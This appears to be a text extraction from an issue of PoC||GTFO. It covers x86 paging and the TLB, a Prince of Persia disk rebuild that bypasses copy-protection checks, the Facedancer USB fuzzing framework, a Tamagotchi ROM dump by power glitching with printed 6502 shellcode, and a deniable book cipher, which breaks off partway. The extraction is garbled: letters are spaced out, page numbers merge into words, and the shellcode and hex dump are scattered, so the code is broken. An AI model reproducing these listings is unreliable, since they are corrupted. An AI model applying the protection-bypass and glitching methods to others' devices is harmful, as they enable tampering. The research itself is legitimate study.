cmp edi , 0xA000
jb . s e t u p _ p a g e t a b l e
; Enable p a g i n g .
mov eax , cr0
or eax , 0 x80000000
mov cr0 , eax
Extensions to the paging logic allowed 32-bit processors to access physical addresses larger than 4GiB,
in the form of Physical Address Extension (PAE). The same also added a NX bit to mark pages as non-
executable (and trap on instruction fetches from them).
Recursive Map
Figure 3: Recursive Page Mapping
In our simplistic case, the entire first 4 megabytes were mapped onto themselves, to so-called identity
map. In the Real World TM , however, it is often the case that the physical memory containing the page
directory/tables is not mapped into the virtual address space. Instead of creating a different page table to
point to the existing paging structures, a neat trick is deployed.
Before explaining the trick, note how the page directory and the page table has the exact same structure,
including the attributes. What happens, then, if an entry in the page directory were to point to itself? The
page directory will be interpreted as a page table. This ‘page table’ will have entries to actual page tables.
10However, the CPU will interpret them as entries corresponding to page frames, allowing you to access them
via the virtual address the page directory was self-mapped to. If that makes your head hurt, the illustration
in Figure 3 might help.
Translation Lookaside Buffer (TLB)
When a virtual memory address is accessed, the CPU is required to walk through the page tables to determine
the page table entry for the specified virtual address. However, walking through the page tables is slow.
In the worst case, a walkthrough requires the processor to do a lookup from RAM for the page directory,
followed by a lookup from RAM for the page table, where a RAM lookup latency is in the order of 100
times that of a cache lookup latency. Instead, the CPU maintains a cache of the virtual address to physical
address translation, known as the Translation Lookaside Buffer (TLB).
When a virtual address is accessed, the CPU first determines if a mapping is present in the TLB. Only
if the CPU fails to find one there, it walks through the actual page tables and then populates the TLB with
the translation.
A problem with the TLB is that changes across the page table don’t get reflected in it automatically. 4
On the x86, there exist two mechanisms to flush particular entries in the TLB:
1. The instruction ‘invlpg address‘ invalidates the TLB entry for the page that contains ‘address‘.
2. Reloading CR3 with the address of a page directory flushes all the entries in the TLB.
3.5
56
Till Next Time
The article got us through the backward-compatibility mess that defines the x86 boot process, into protected
mode with paging enabled. In the next issue, we’ll look at x86 interrupt handling, the programmable interrupt
timer, multiprocessor initialization, and then the local APIC timer. We’ll also answer some unanswered
questions (like what happens if a page table entry doesn’t exist) and conclude with a (hopefully) nifty
proof-of-code.
Till then,
hlt :
hlt
jmp hlt
poCoRgtfO
4 This is how PaX’s PAGEEXEC emulates the NX bit by memory trapping with very little performance overhead: it sets
the page table entries for the “data” pages to always trap, but allows a data access (i.e., EIP not in the accessed page) to go
through. After this, it immediately resets the page table entry, but relies on the TLB for repeated page accesses to not trap.
Truly, it is a work of art! –PML
5 CR3 is usually reloaded to change the process context (will be covered across future articles). However, a change of process
does not require that the entries for the kernel pages in the TLB get flushed. To avoid so, the global bit in the page table entry
can be set, and global pages can be enabled in CR4. Doing so ensures that the entry for the specific page in the TLB can only
be invalidated via a ‘invlpg‘.
6 The x86-64 architecture saw the introduction of tags as a part of the TLB entry, in 2008. Thus, each TLB entry is associated
with a particular tag, and context switches can only involve changing of the current tag.
114
Prince of PoC; or,
A 16-sector version of Prince of Persia for the Apple ][.
by Peter Ferrie
Just in time for the 25th anniversary of Prince of Persia on the
Apple ][, I present to you the first ever two-sided 16-sector version!
The funny thing is that I never played it on the real Apple ][,
only on the PC. Even after I acquired an Apple ][ .nib version in
2009, I didn’t play it. Of course, the reason for that was, I was still
using ApplePC as my Apple ][ emulator, and it had a fatal memory-
corruption bug that crashed the game. Finally in 2014, I made the
switch to AppleWin. AppleWin had its own bugs, but nothing that
I couldn’t work around.
The retail version of the Apple ][ version of Prince of Persia came
on two sides of a single disk. The sectors were stored in 18-sector
format, and they were full. As a result, the 16-sector cracked ver-
sions all made use of an additional side to store those extra sectors.
In 2013, about a year after the source code was recovered, Roland
Gustafsson was interviewed and expressed the opinion that the three-
side version “was silly and really not impressive.” Taking this as a
challenge, I decided to make a two-sided 16-sector version.
I started with the “rebuilt from source” version. The first thing
that you will notice is that it looks different in one particular place.
The reason is that whoever built it used the 3.5” settings but placed
it in the 5.25” format. It means that it never asks to turn over the
disk when you reach Level 3. It prompts to “insert” the disk instead,
as though it is a single disk.
4.1
If you build it, they will come
So I decided to build it myself in an emulated Apple ][. As no one seems to have ported Git to this platform,
I went through a rather round-about ritual of converting and compiling the code.
First, I started AppleWin and formatted a DOS 3.3 disk. Onto this disk, I saved some binary files the
same size as the source files, then exited AppleWin. Now that the disk was ready, I used a hex editor to
change the file types to text, to avoid the need to carry the load address and size.
I converted the source code by changing all line endings from LF to CR, setting the high bit on every
character and inserting them in my own tool. (I really need to port that tool to ProDOS.)
Starting AppleWin again, I used Copy ][ Plus to move the files from a DOS 3.3 disk to a ProDOS disk.
Using the Merlin assemble, I loaded and assembled the source files, saving object files to disk. Now that the
object files were ready, I copied them back to the DOS 3.3 disk with Copy ][ Plus and exited AppleWin.
Finally, I extracted the files with another of my own tools that needs a ProDOS port, inserted images
at the appropriate locations in the track files, and used a hex editor to place those track files onto the disk
image.
4.2
Try Try Again, and Again and Again
The first thing that I noticed is that it won’t boot, as building the 5.25” version enabled the copy-protection,
which began in the boot phase. I worked around that one by bypassing the failure check.
The second thing that I noticed is that—thanks to another layer of copy protection—you couldn’t play be-
yond Level 2. The second-level copy protection relied on two variables, named redherring and redherring2.
The redherring variable was set indirectly during the boot-time copy protection check. However, the
12redherring2 was never set in the source code version. Presumably someone removed the code (but did not
notice that the declaration remained in the header file) because it wasn’t used in the 3.5” version, because
that version was not copy-protected. Unfortunately, without that value in the 5.25” version, you couldn’t
start the later levels. It was set in the retail 5.25” version, however, and thus we also found out that the
source code was only for the 3.5” version. I bypassed this problem by writing the proper value to the proper
place manually.
The third thing I noticed was that the graphics become corrupted on Level 4. The reason was yet another
layer of copy-protection, which was executed before starting Level 1, but the effect was delayed until after
starting Level 4. Nasty. :-) The end sequence was affected similarly. If the copy-protection failed, then
the graphics became corrupted and the game froze on Level 14 (the reunion scene). This was an interesting
design decision. If the protection was bypassed in the wrong way—by skipping the check on Level 4, instead
of fixing the variable that was being compared—then that second surprise awaited. I worked around that
one in the correct way, by bypassing the failure check.
The fourth thing I noticed is that the graphics became corrupted and then game crashed into text mode
when starting Level 7. The reason was the final layer of copy-protection, which was executed after completing
Level 1, but the effect was delayed until the start of Level 7. Very nasty. ;-) I worked around that one by
bypassing the failure check.
Finally, I checked the rest of the “rebuilt from source” version. The most important thing (depending
on your point of view) was that all of the hidden parts were missing—the hidden routines (see below) and
the hidden message (which was the decryption key for the original code). I also found that track $11 was
completely missing from side B, so the side B ‘ˆ’ routine (see below) caused a hang. Some of the graphics
data were truncated, too, when compared to the retail version which I acquired in the meantime. Even
though I didn’t notice any difference when I played it, I gave up on that idea, and just ripped the tracks
from the 5.25” retail version instead.
4.3
Turn Disk Over
Another interesting thing is how the game detects which side of the disk is in the drive. The protected version
uses a unique value in the prologue data for the two sides ($A9 and $AD), and uses an API to specify which
one to expect. Since a standard 16-sector disk also has a standard prologue, which is identical on both sides,
that was no longer an option for me. Instead, I chose to find a free sector in a location that was common
to both sides, and placed the special byte there. When the prologue API was used, I redirected my read
routine so that the next read request would first seek to the free sector and read the byte. If they matched,
then the proper side was inserted already. Otherwise, the routine would read the sector periodically until
that became true.
4.4
Size Does Matter
At a high level, the solution to the size problem is one of compression—technically, further compression,
since some of the data are compressed already. However, I required a compression algorithm that packed
well, was fast to decompress, and most importantly, small. The size limitation was significant. The game
requires 128kb of memory, and uses almost all of it. I was fortunate enough to find a small (4096 bytes)
region at $d000 in main memory, in which to place my loader and the read buffer. This was the location of
the original loader for the game. I simply replaced it with my own. I needed a read buffer within that region,
because I had to load the compressed data somewhere before decompressing it into its final destination. I
wanted the read buffer to be as large as possible, in order to reduce the number of read requests that I had
to make. Shown in Figure 4, I managed to fit the loader code and data into under 1280 bytes: 752 bytes of
code, 202 bytes for the sector table, the rest was dynamic data. That left me with 2816 bytes for the read
buffer.
That space was so small that the write routine (for saving the game after you reach side B) would not fit
in memory at the same time. To work around that problem, I separated the write routine, and loaded and
executed it dynamically when a save request was made. It was discarded after it has done its job.
13Back to the choice of compression.
I have written Apple ][ implementations for two well-known algorithms: LZ4 and aPLib. I did not want to
write another one, so I was forced to choose between them. LZ4 was both fast and small (my implementation
was only 152 bytes long), but it did not pack well enough. It had to be aPLib. aPLib packs well (about
20kb smaller than LZ4), is fast enough when factoring in the reduced number of sectors to read, and small
(my implementation is only 228 bytes long, so less than one sector).
Some of the sectors are read only individually, some of them are read only as part of an entire track,
and some of them are read using both methods, depending on the context. Once I determined how each of
the sectors was loaded, I grouped them according to the size of the read, and then compressed the resulting
block. I gave myself only two days total for the project, but it ended up taking me about two weeks. Most
of that time was spent on finding an appropriate data structure.
I finally chose a variable length region set to describe the placement of the sectors within a track. This
yielded a huge advantage for the sectors which were read only in track mode, when the packed size of the
single region was too large for the read buffer. In that case, the file could be split into two smaller virtual
regions, compressed separately to fit. The split point was determined by splitting into all 17 pairs (1 and
17, 2 and 16, 3 and 15 . . . ), compressing the pairs, then identifying the smallest pair. The smallest pair
was chosen by the minimum number of sectors and then the minimum number of bytes. The assumption
was that it costs more to decompress fewer bytes in more sectors, than to decompress more bytes in fewer
sectors, even if the decompression was faster in the first case, because of the time to read and decode the
additional sector. However, the flexibility of the region technique allowed the alternative case to be used
without any changes to the code.
The support for the sector reads was flexible, too. Since the regions were defined only by their start and
length, I could erase the individual addresses from the 18-sector requests. This allowed me to move sectors
within a track, and to make the corresponding change in the 18-sector request packet. This was actually
needed for track 4. For track 4, the region that began at sector $0a did not fit into 6 sectors even after
compression. Fortunately, the region that began at sector 0 needed only 7 sectors, so the region at sector
$0a could move to sector 9. This was enough to get it to fit. For track $13, the first two sectors were never
accessed, so I could have moved sector 2 to sector 0, but there was no benefit to it.
Overall, my technique saved over 11 tracks on the first side, and over 16 tracks on the second side. Not
enough for a single-side version, though. 7 ;-)
4.5
And Now for Dessert: Easter Eggs!
While digging through the game code, I found several hidden routines. When playing side B, press ‘ˆ’ after
completing a level to see an animation of Jordan waving, press a key at the end to view it again. In the byte
bastards version, type RAMROD at the crack page for a hidden message.
Before booting, hold both Apple keys, then press one of the following to activate hidden modes.
DEL
!
ENTER
@
ˆ
Only on //GS, displays an oscilloscope.
Displays a message, and then a lo-res animation.
Continually draws a fractal, press ‘c’ to change colors.
Displays a bouncing, spinning cube.
Pulses the drive head. Move joystick to change tone, sounds like a motorcycle.
Neighbors, is this not a tale of Shakespearean proportions and passions? A young prince, a mystery of
code broken by underhanded blows in the dark, the poisoned daggers of copy-protection that even perpetrators
forgot about—all laid bare by a contrived play of PoC! Is the Play the Thing, or is PoC the Thing, or are
they the Thing together? You decide! –PML
7 As a point of interest, I experimented with concatenating the entire data together, and including the sector offset in the
table. That decreased the space quite significantly, but at a cost of increasing the size of the code, and making updating the
data extremely difficult. That version saved over 13 tracks on the first side, and over 18 tracks on the second side. However,
this was still not enough for a single-side version. In the end, it was not worth the effort, and it will not be released.
14#
00
01
02
03
04
05
06
07
08
09
0a
0b
0c
0d
0e
0f
10
11
12
13
14
15
16
17
18
19
1a
1b
1c
1d
1e
1f
20
21
22
Side A
trk
sectors (00-0d)
trk
sectors (00-09, 0a-11)
trk
trk
trk
trk
trk
trk
trk
sectors (00-05, 06-11)
sectors (00-0b / 0c-11)
trk
trk
trk
trk
trk
sectors (02-11)
sectors (04-11 / 00-03)
trk
trk
trk
trk
trk
trk
trk
trk, sectors (0d-11)
trk
trk
trk
sectors (00-08, 09-11)
sectors (00-08 / 09-11)
sectors (02-11), trk
Side B
trk
trk
trk
trk
sectors (00-05, 06-11)
sectors (00-0b)
trk
trk
trk
trk
trk
sectors (00-05 / 06-11)
sectors (00-0b / 0c-11)
trk
trk
trk
trk
trk
trk
trk
trk
trk
trk, sector 01
sector 01
trk
trk
trk
sectors (00-08)
sectors (00-08 / 09-11)
sectors (00-08 / 09-11)
sectors (00-08 / 09-11)
sectors (00-08 / 09-11)
sectors (00-08 / 09-11)
sectors (00-08 / 09-11)
trk
Figure 4: Tracks and Sectors
155
A Quick Introduction to the New Facedancer Framework
by gil
Recently, I rewrote the Facedancer software stack with the goal of
making it easier to write new emulators for both well-behaved and poorly-
behaved devices. In this post I’m going to give an introduction to doing
both. I assume you’ve got a Facedancer board, python3, the pyserial
library, and a current revision of the code. I’ll start with a very brief
overview of the USB protocol itself, then show how to modify the existing
USB keyboard emulator code to emulate a different (yet still well-behaved)
device, and finally show how to take a well-behaved device and make it
misbehave in specific ways.
5.1
USB
The USB protocol defines a bunch of abstractions: Devices, Configura-
tions, Interfaces, and Endpoints. Some of these terms are a bit counterin-
tuitive, understanding of which is not at all aided by how they’re referred
to by users.
A Device is a physical thing that gets plugged into a USB port. A single physical device may present
itself to the operating system as multiple logical devices (think a keyboard with built-in trackpad or one of
those annoying USB sticks that pretends it’s both a USB mass storage device and a USB CD-ROM so it
can install adware). In USB parlance, each of the logical devices is not a Device, but rather an Interface.
I’ll get to those in a couple paragraphs.
When a device is connected to a host, the host begins the enumeration process, in which it requests and
the device responds with a bunch of descriptors that describe how the device can and/or wants to behave.
The device presents to the host a set of “configurations”; the host chooses exactly one of these and the device,
er, configures itself accordingly. But what’s a configuration? It’s a set of interfaces!
An Interface is a single logical device as mentioned above: a keyboard XOR a trackpad XOR an external
hard drive XOR an external CD-ROM XOR. . . From the perspective of writing software emulators for these
things, this architecture is actually kinda helpful: we can write a single interface implementing a keyboard
and then include it in various device implementations. Code reuse FTW.
Each interface contains multiple “endpoints,” which are the actual communication channels to and from
the host. Only one endpoint is required: endpoint 0 (EP0) is the bidirectional “control” endpoint, used
for exchange of descriptors on connection and optionally for asynchronous communication thereafter. (The
various ways a device and host can communicate are beyond the scope of this post and, considering the
tendency of device manufacturers to fabricate their own protocols to run over USB, probably intractable
to cover in any single document. Your best bet to gain understanding are either fuzz it or read the device
driver code.)
Endpoints other than EP0 are unidirectional so, in the case of something like an external hard drive
that needs to both send and receive large amounts of data, the interface will define two endpoints: one for
host-to-device (“OUT”) transfers and another for device-to-host (“IN”) transfers.
Lastly, the USB protocol (up to and including USB 2.0) is “speak when spoken to”: all device commu-
nication is initiated by the host, which means even more state machines and callbacks than you might have
been expecting.
With that, let’s go to the code.
5.2
A Simple Device
All of the source files are in the “client” subdirectory of the SVN tree. You can tell the new stuff from the
old:
161. The old libraries are named GoodFET*.
2. The old programs are named goodfet.*.
3. The new libraries are named USB* (plus MAXUSBApp.py, Facedancer.py, and util.py.)
4. The new programs are named facedancer-*.
Start by looking at facedancer-keyboard.py. It’s pretty simple: we import some stuff, open a connec-
tion to the serial port, say we want to talk to a Facedancer on the serial port, then we want to talk to
the MAXUSBApp on the Facedancer, and we hand this to an instance of the USBKeyboardDevice class, which
connects the emulated device to the victim and we’re off to the races. Easy enough.
The good news here is that you shouldn’t have to ever worry about what goes on in the Facedancer
and MAXUSBApp classes; the entirety of the logic specific to any given USB device is contained with the
USBDevice class, of which (in this case) USBKeyboardDevice is a subclass. To create your own device, just
create a new class that inherits from USBDevice and customize it as you see fit. As an example, look at
USBKeyboardDevice.py for the implementation of the USBKeyboardDevice class.
Way at the bottom of USBKeyboardDevice.py, you’ll find the definition for the USBKeyboardDevice
class. It’s fairly short: we define a single configuration (notice the configurations are numbered from 1) that
contains a single interface, then we send that configuration on to the superclass initializer along with a bunch
of magic numbers. These magic numbers are primarily used by the host operating system to figure out which
driver to use with the attached device. From the Facedancer side, however, the keyboard functionality is
implemented in the USBKeyboardInterface class, which takes up most of the file. Scroll back up to the top
and look at that now.
The hid_descriptor and report_descriptor are hard-coded as opaque binary data specific to HID de-
vices (I may abstract away their details at some point, but it’s not a particularly high priority). In __init__,
there’s a dictionary mapping descriptor ID numbers to the actual descriptor data, which is sent to the super-
class initializer (I’ll get into more detail on this in the section on misbehaving devices). Also in __init__,
a single USBEndpoint is instantiated, which includes a callback (self.handle_buffer_available).
Remember that the device never initiates a data transfer: the host will ask the device if it has any data
ready; if it doesn’t, the device (in our case, the MAX3420 USB chip on the Facedancer board itself) will
respond with a NAK; if it *does* have data ready, the device will send the data on up. Thus whenever the
host asks for data for this particular endpoint, the callback will be invoked. (“Whenever” is a bit misleading
because the host will likely send polls faster than we can deal with them, but it’s close enough for the time
being.)
The handle_buffer_available method calls type_letter, which sends the keypress over the endpoint.
(This abstraction as it stands right now is messy and is high on my list to fix—the USBEndpoint class should
have “send” and “receive” methods, rather than having to climb up through the abstraction layers to the
send_on_endpoint call currently in type_letter.)
To make a very long story short, writing an emulator for a new device should be straightforward:
1. Subclass USBInterface (eg, as MyNewInterface), define your set of endpoints and pass them to the
superclass initializer, and define endpoint handler functions.
2. Subclass USBDevice (eg, as MyNewDevice), define a configuration containing MyNewInterface, and
pass it along to the superclass initializer.
5.3
A Misbehaving Device
If you subclass USBDevice and USBInterface as described above, the rest of the class hierarchy should do
the Right Thing (TM) with regards to the USB protocol itself and talking to the Facedancer to perform
it: appropriate descriptors will be sent when requested by the host, correct callback functions will be called
when endpoints are polled by the host, etc. But if you want to test how systems react in the face of devices
that don’t perform exactly as expected, you’re going to have to dig in a bit.
17The pattern I’ve tried to follow (though there are certainly deviations, which I intend to deal with—
patches appreciated!) is for the USBDevice class to handle control messages over endpoint 0 and dispatch
them to the appropriate instance of (subclasses of) USBConfiguration, USBInterface, or USBEndpoint. For
example, if the host sends a GET_DESCRIPTOR request for the configuration, the request is dispatched
to USBConfiguration.get_descriptor, which returns the data to be sent in response.
This logic is contained in the USBDevice.handle_request method; if you want your custom misbehav-
ing device to do weird stuff for every incoming request, this is the method to override. If, on the other
hand, you’re looking to mess with just descriptors for a specific abstraction, you’re better off overriding
the get_descriptor method of the USB* classes. If you want to send non-standard responses to any of
the other control messages (eg, CLEAR_FEATURE, GET_STATUS, etc), you should override the associ-
ated handle_*_request method of USBDevice. (Note that USBDevice.handle_request is the method that
dispatched to the handle_*_request methods.)
Each of the top-level USB* classes (USBDevice, USBConfiguration, USBInterface, and USBEndpoint)
has a self.descriptors member that maps from descriptor number to a descriptor or a function that
returns a descriptor. Thus you are not constrained to hard-coding values, you can instead provide a function
that creates whatever descriptor you want sent.
To make a somewhat less-long story short, modifying an emulated device to misbehave should be similarly
straightforward.
1. Subclass whichever of USBDevice, USBConfiguration, USBInterface, or USBEndpoint contains the
behavior you want to modify.
2. Override the descriptor dictionary in your subclass to change what descriptors get sent in response
to requests.
3. Override the handle_*_request methods in your subclass of USBDevice to change how your device
responds to individual requests.
4. Over the USBDevice.handle_request method to change how your device responds to all requests.
Happy fuzzing!
186
Dumping Firmware from Tamagotchi Friends by Power Glitching
by Natalie Silvanovich, Tamagotchi Merchant of Death
with the kindest of thanks to Mr. Blinky.
Figure 5: These sprites were among many dumped from the Tamagotchi Friends ROM.
The Tamagotchi Friends is the latest addition to the Tamagotchi series of virtual pet toys. Released
on Boxing Day of 2013, it features NFC messaging and games as a part of a traditional Tamagotchi toy.
Recently, I used glitching to dump the code of the Tamagotchi Friends.
The code for the Tamagotchi Friends is stored in mask ROM internal to its GeneralPlus GPLB series
LCD controller. In the previous Tamagotchi version (the Tamatown Tama-Go), I used a vulnerability in the
processing of external data from a flash accessory to dump the code, but this is not possible for the Tamagotchi
Friends, as it does not support flash accessories. In fact, the Tamagotchi Friends has a substantially reduced
attack surface compared to the Tamatown Tama-Go, as it also does not support infrared communications.
The only available inputs on the Tamagotchi Friends are the buttons, the EEPROM (which is used to store
important persistent data, like the number of slices of carrot cake your Tamagotchi has on hand) and NFC.
After eavesdropping on and simulating the NFC, and dumping and rewriting the EEPROM, I determined
that they both had limited potential to contain exploitable bugs. They did both appear to fill buffers in
RAM with user-controlled data in the course of normal operation though, which meant they both could be
useful for creating shellcode buffers in the case that there was a bug that allowed the program counter to be
moved to the buffer.
One possible way to move the program counter was glitching, basically driving unexpected signals into
the microcontroller and hoping that they would somehow cause that program counter to change and by
chance land in the shell code buffer. Considering that memory space of the microcontroller is 65,536 bytes,
and the largest buffer I could fill with a NOP slide is roughly 60 non-contiguous bytes this sounds like a long
shot, but the 6502 architecture used by the microcontroller has some properties that makes random program
counter corruption more likely to lead to code execution compared to other architectures. To start, it has no
memory validation, so any access of any address will succeed, regardless of whether any memory is mapped
to the location. This means that execution will not stop even if an invalid address is accessed. Also, invalid
19opcodes on 6502 are guaranteed to execute in a finite amount of time 8 with undefined behaviour, so they
also will not stop execution. Together, these properties make it very unlikely that execution will ever stop
on a 6502 processor, giving shellcode a lot of chances to get executed in the case that the program counter
is corrupted.
Another useful feature of this particular microcontroller is that the
RAM starts at address zero, and the lowest hundred bytes or so of RAM
is used by the SPU and is often zero. In 6502, zero is the opcode for
BRK, which acts like NOP if a debugger is not attached, so this RAM
could potentially act as a NOP slide. In addition, in the Tamatown Tama-
Go (and I assumed the Tamagotchi Friends), the EEPROM is copied
to address 0x300, which is still fairly low in RAM addresses. So if the
program counter got set to zero, there is a possibility it could slide through
RAM up to the EEPROM. Of course, not every value in RAM before
0x300 is zero, but if enough are, it is likely that the other values will be
interpreted as instructions that don’t alter the program counter’s course
some portion of the time.
Since setting the program counter to zero seemed especially likely to
cause code execution, I started by glitching the input power, as this had
the potential to clear the program counter. The Tamagotchi Friends
has three types of volatile memory: registers like the program counter,
DPRAM (used for the LCD) and SRAM. DPRAM and SRAM both have
fairly long persistence after they stop being powered, so I hoped if I cut the
power to the microcontroller for a short period of time, it would corrupt
the registers, but not the RAM, and resume execution with the program
counter at address zero.
I tried this using an Arduino to switch the power on and off at differ-
ent speeds. For very fast speeds, the Tamagotchi didn’t react at all, and
for very slow speeds, it would reset every cycle. I eventually settled on
cycling every five milliseconds, which had a visible erratic impact on the
Tamagotchi after each cycle. At this rate, the toy was displaying an un-
expected image on the LCD, corrupting the LCD, playing Yankee Doodle
or screeching loudly.
I filled up the EEPROM with a large NOP slide and some code that
caused a write to the LCD screen, reset the Tamagotchi so the EEPROM
was downloaded into RAM, and cycled the power. Roughly one out of
every ten times, the code executed and wrote the LCD.
I then moved the code around to figure out the size of the available
code buffer. Two things limited the size. One is that only a small part of
the EEPROM is copied into RAM at once, and the rest is only loaded if
needed. The second is that some EEPROM addresses are validated. For
some of these addresses, containing very critical values, the EEPROM is wiped immediately if the Tamagotchi
detects an invalid value. These addresses couldn’t be used for code at all. Some other less critical values get
overwritten if they are invalid. For example, if a Tamagotchi is a child, but is married, the “is married” flag
will be reset to the correct value. These addresses could be changed, but there was no guarantee they would
stay the correct value, so I ended up jumping over them. This left exactly 54 bytes for code. It was tight,
but I was able to write code that dumped the ROM over SPI through the Tamagotchi buttons in that space
The following is the shellcode I used:
SEI ; d i s a b l e t h e low b a t t e r y i n t e r r u p t
LDA #$FF
8 A few people have mentioned to me that there are certain versions 6502 processors for which this is not true, but this is
definitely the case for GeneralPlus controllers.
20STA
STA
STA
STA
LDX
LDA
ASL
LDY
BCC
LDY
BNE
NOP
NOP
NOP
NOP
NOP
STY
LDY
STY
DEX
BNE
INC
BNE
INC
BNE
LDA
STA
BNE
$3011 ;
$1109 ;
$00C5
$00C6
#$08
( $C5 ) ,Y
A
#$01
$001A
#$03
$0020 ;
port d i r e c t i o n
LCD i n d i c a t o r
; No room t o i n i t i a l i z e Y.
Worst c a s e ,
; i t w i l l be s e t t o 0 a t t h e end o f t h e l o o p .
These 4 b y t e s g e t a l t e r e d b e f o r e e x e c u t i o n .
Jump o v e r them .
$3012
#$00
$3012
$0013
$00C5
$000F
$00C6
$000F
#$00
$3000
$000F ; Branches a r e s h o r t e r than jumps , s o u s e i m p l i e d c o n d i t i o n s .
In memory, this shellcode is as follows:
300:
310:
320:
330:
340:
350:
360:
370:
32
20
77
FF
03
A2
03
D0
17
FF
77
FF
78
08
EA
DE
02
06
77
40
A9
B1
8C
EE
01
10
77
EA
FF
C5
12
C6
02
01
77
EA
8D
0A
30
00
01
FF
05
EA
11
A0
A0
D0
09
FF
04
EA
30
01
00
D9
00
02
FF
EA
8D
90
8C
4C
1A
77
77
00
09
02
12
4B
00
77
77
00
11
A0
30
03
1A
77
55
00
8D
03
CA
15
1A
77
00
00
C5
D0
D0
11
1A
77
77
00
00
04
E7
4C
1A
77
77
00
8D
EA
EE
38
1A
77
7F
00
C6
00
C5
00
1A
77
00
00
00
00
00
00
The code begins at 341 and ends at 376, which are the bounds of the buffer copied from the EEPROM.
The surrounding values are typical values of the surrounding RAM which are not consistent across each time
code is executed. The 0x03 before the beginning of the code is written after the buffer, and is an undefined
instruction in 6502. Unfortunately, this means that there isn’t room for any NOP sled, the program counter
needs to end up at exactly the right address.
One useful feature of this shellcode is that the first seven instructions aren’t strictly necessary! The
registers are often the right value, or an acceptable value by chance, which gives the program counter a bit
more leeway in the case that it jumps a bit beyond the beginning of the code.
I dumped all thirty-two pages of ROM using this shellcode, and they appear to be accurate. Figure 5
shows the highlights of the dump, organized by cuteness in descending order.
217
Lenticrypt: a Provably Plausibly Deniable Cryptosystem; or,
This Picture of Cats is Also a Picture of Dogs
by Evan Sultanik
Deniable cryptosystems allow their users to plausibly deny the
existence of the plaintext content of their encrypted data. There are
many existing technologies for accomplishing this (e.g., TrueCrypt),
which usually accomplish it by having multiple separate encrypted
volumes in the ciphertext that will decrypt to different plaintexts
depending on which decryption key is used. Key k 1 will decrypt
to innocuous volume v 1 whereas key k 2 will decrypt to high-value
volume v 2 . If an adversary forces you to reveal your secret key, you
can simply reveal k 1 which will decrypt to v 1 : the innocuous volume
full of back-issues of PoCkGTFO and pictures of cats. On the other
hand, if the adversary somehow detects the existence of the high-
value volume v 2 and furthermore gains access to its plaintext, the
jig is up and you can no longer plausibly deny its contents’ existence.
This is a serious limitation, since the high-value plaintext might be
incriminating.
An ideal deniable cryptosystem would allow the creator of the ciphertext to plausibly deny having created
the plaintext regardless of whether the true high-value plaintext is revealed. The obvious use-case is for
transmitting illegal content: Alice wants to encrypt and send her neighbor Bob a pirated copy of the
ColecoVision game George Plimpton’s Video Falconry. She doesn’t much care if the plaintext is revealed,
however, she does want to have a plausible legal argument in the event that she is prosecuted whereby she
can deny having sent that particular file, even if the high-value file is revealed. In the case of systems like
TrueCrypt, she can’t really deny having created the alternate hidden volume containing the video game since
the odds of it just randomly occurring there and a key happening to be able to decrypt it are astronomically
small. But what if, using our supposed “ideal” cryptosystem, she could plausibly claim that the existence of
the video game was due to pure random chance? It turns out that’s possible, and we have the PoC to prove
it!
Before we get to the details, let’s first dispel the apparent nefariousness of this concept by discussing
some more legitimate use-cases. For example, we could encrypt a high-value document such that it decrypts
to either a redacted or unredacted version depending on the key. If the recipients are not aware that they
have unique keys, one could deliver what appears to be a single encrypted message to multiple recipients
with individualized content. The individualization of the content could also be very subtle, allowing it
to be used as a unique watermark to identify the original source of a leaked document: a so-called “canary
trap.” Finally, “deep-inspection” filters could be evaded by encrypting an innocuous payload with a common,
guessable password.
7.1
Running Key Ciphers
A running key cipher is one of the most basic cryptosystems, yet, if used properly, it can be one of the most
secure. Being avid PoCkGTFO readers, Alice and Bob both have a penchant for treatises with needlessly
verbose titles that are edited by Right Reverend Doctors. Therefore, for their secret key they choose to use
a copy of a seminal work on cryptography by the Rt. Revd. Dr. Lord Bishop John Wilkins FRS.
22Mercury :
or the
Secret and Swift
Messenger.
s h e w i n g,
How a Man may with Privacy and
Speed communicate his Thoughts
to a Friend at any diõance.
T ̇ Second Edition
By the Right Reverend Father in God,
J o h n W i l k i n s, late Lord
Bishop of C h e s t e r.
Founder of the Royal Society
L O N D O N,
Printed for Ri ̃. Baldwin, near the
Oxford-Arms in Warwick-lane. .
They have agreed to start their running key on the first line of the book, which reads:
“
Every rational creature, being of an imperfe and dependant Happiness, is
therefore naturally endowed with an Ability to communicate its own Thoughts
and Intentions ; that so by mutual Services, it might better promote it self in the
Prosecution of its own Well-being.
”
The encryption algorithm is then very simple: Each character from the running key is used as a rotation
to permute the associated character of the plaintext. For example, say that the first character of our plaintext
is “A”; we would take the first character of our running key, “E”, look up its numerical index in the alphabet,
and rotate the plaintext by that much to produce the ciphertext.
Plaintext:
Running Key:
Ciphertext:
AN ADDRESS TO THE SECRET SOCIETY OF POC OR GTFO. . .
EV ERY|RATI ON AL|C REATUR E|BEING|O F|A N|IM PE RFEC. . .
EI EUBIELA HB TSG JICKYK WPGQRZM TF CWO DV XYJQ. . .
There are of course many other ways the plaintext could be combined with the running key, another common
choice being XORing the bits. If the running key is truly random then the result will almost always be what
is called a “one-time pad” and will have perfect secrecy. Of course, my expository example is nowhere near
secure since I preserved whitespace and used a running key that is nowhere near random. But, in practice,
this type of cryptosystem can be made very secure if implemented properly.
7.2
Book Ciphers
Perhaps the most basic type of cryptosystem—one that we’ve all likely independently discovered in our early
childhood—is the substitution cipher: Each letter in the alphabet is statically mapped to another. The most
common substitution cipher is ROT13, in which the letters of the alphabet are rotated 13 steps.
23a b c d e f
o p q r t u v w x y z a b c d e
s
g h
i
j
k
l m n o p q r
f
s
t u v w x y z
g h
i
j
k
l m n
In fact, we can think of the running key cipher we described above as a sort of substitution cipher in which
the alphabet mapping changes for each byte based off of the key.
Book Ciphers marry some of the ideas of substitution ciphers and running key ciphers. First, Alice and
Bob decide on a shared secret, much like the book they chose as a running key above. The shared secret needs
to have enough entropy in order to have at least one instance of every possible byte in the plaintext. For
each byte in the shared secret, they create a lookup table mapping all 256 possible bytes to lists containing
all indexes (i.e., file offsets) of the occurrences of that byte in the secret:
with open ( s e c r e t _ k e y _ f i l e ) as s :
i n d e x e s = dict ( [ ( b , [ ] ) f o r b in range ( 2 5 6 ) ] )
f o r i , b in enumerate (map( ord , s . r e a d ( ) ) ) :
i n d e x e s [ b ] . append ( i )
Then, for each byte encountered in the plaintext, the ciphertext is simply the index of an equivalent byte in
the secret key:
def e n c r y p t ( p l a i n t e x t , i n d e x e s ) :
f o r b in map( ord , p l a i n t e x t ) :
print random . c h o i c e ( i n d e x e s [ b ] ) ,
To decrypt the ciphertext, we simply look up the byte at the specified index in the secret key:
